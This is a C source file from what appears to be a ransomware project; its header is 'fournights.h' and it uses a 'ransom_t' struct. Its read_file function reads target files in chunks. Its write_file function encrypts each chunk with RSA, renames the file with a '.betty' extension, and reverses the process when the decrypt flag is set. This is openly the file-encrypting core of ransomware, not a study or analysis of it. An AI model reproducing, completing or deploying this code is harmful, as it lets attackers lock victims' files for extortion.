#include "fournights.h"
/**
  * read_file - reads lines from a file, and executes a function on them.
  * @filepath: filepath to read
  * @head: head of a linked list
  * @fxn: pointer to function to enact on char buffer
  * Return: number of bytes read
 **/
size_t read_file(const char *filepath, ransom_t *ransom, char *(*fxn)(char *, ransom_t *))
{
	size_t bytes_read = TMP_BUFS->bytes_read;
	off_t file_offset = TMP_BUFS->file_offset;
	unsigned int st_size = (unsigned int)TMP_BUFS->file_info.st_size;
	FILE *fd = NULL;

	if (!filepath || !ransom)
		return(0);
	if(st_size == 0)
	{
#ifndef NO_DEBUG
		fprintf(stderr, "File is empty\n");
#endif
		return(0);
	}
	if ((fd = fopen(filepath, "rb")))
		fseek(fd, file_offset, SEEK_SET);
	else
		return(0);
#ifndef NO_DEBUG
	printf("\n\n----------------------------------------------\n");
	printf("st_size: %d - file_offset: %d == %d\n", st_size, (int)TMP_BUFS->file_offset, st_size - (int)TMP_BUFS->file_offset);
	printf("bytes_read: %d\n", (int)bytes_read);
	getchar();
#endif
	if ((st_size - (int)file_offset) > BIGBUF)
		bytes_read = BIGBUF;
	else
		bytes_read = (size_t)st_size - file_offset;
	fread((char *)TMP_BUFS->buf, bytes_read, sizeof(char), fd);
	fclose(fd);
	/* update tmp buffer struct to use in main. Set end of bytes read to null, for printing later*/
#ifndef NO_DEBUG
	TMP_BUFS->buf[bytes_read] = '\0';
#endif
	TMP_BUFS->file_offset += bytes_read;
	TMP_BUFS->bytes_read = bytes_read;

#ifndef NO_DEBUG
		printf("DEBUG\n");
#endif
	/* call external function */
	if(fxn)
		fxn(TMP_BUFS->buf, ransom);
	return (bytes_read);
}

/**
  * write_file - writes the contents of a buffer to a file.
  * @filepath: filepath to write
  * @buffer: buffer to write into the file
  * Return: number of bytes read
 **/
char *write_file(char *buffer, ransom_t *ransom)
{
	int cipher_buf_size = 0;
	int new_ext_len = 0, filepath_len = 0, bytes_written = 0;
	char *new_ext = ".betty";
	unsigned char *cipher_buf = NULL;
	FILE *fd = NULL;

	filepath_len = (int)my_strlen(TMP_BUFS->filepath);
	new_ext_len = (int)my_strlen(new_ext);
	cipher_buf = TMP_BUFS->cipher_buf;
	/** ENCRYPT **/
	if (ransom->cipher_flag == 'e')
	{
		if (find_substr_end(TMP_BUFS->filepath, new_ext) == 0)
			my_strncat(TMP_BUFS->filepath, new_ext, filepath_len, new_ext_len);

		if ((fd = fopen(TMP_BUFS->filepath, "ab+")))
			fseek(fd, TMP_BUFS->file_offset, SEEK_SET);
		else
			return(NULL);
		cipher_buf_size = encrypt_rsa(buffer, ransom);
	}
	/** DECRYPT **/
	else if (ransom->cipher_flag == 'd')
	{
		if (find_substr_end(TMP_BUFS->filepath, new_ext) != 0)
			TMP_BUFS->filepath[filepath_len - new_ext_len] = '\0';
		if ((fd = fopen(TMP_BUFS->filepath, "ab+")))
			fseek(fd, TMP_BUFS->file_offset, SEEK_SET);
		else
			return(NULL);
		cipher_buf_size = decrypt_rsa(buffer, ransom);
	}
	/* Write to file */
	if ((bytes_written = fwrite(cipher_buf, cipher_buf_size, sizeof(char), fd)) < 1)
	{
#ifndef NO_DEBUG
		fprintf(stderr, "No bytes written\n");
#endif
	}
	fclose(fd);
	chmod(TMP_BUFS->filepath, TMP_BUFS->file_info.st_mode);
	return(buffer);
}
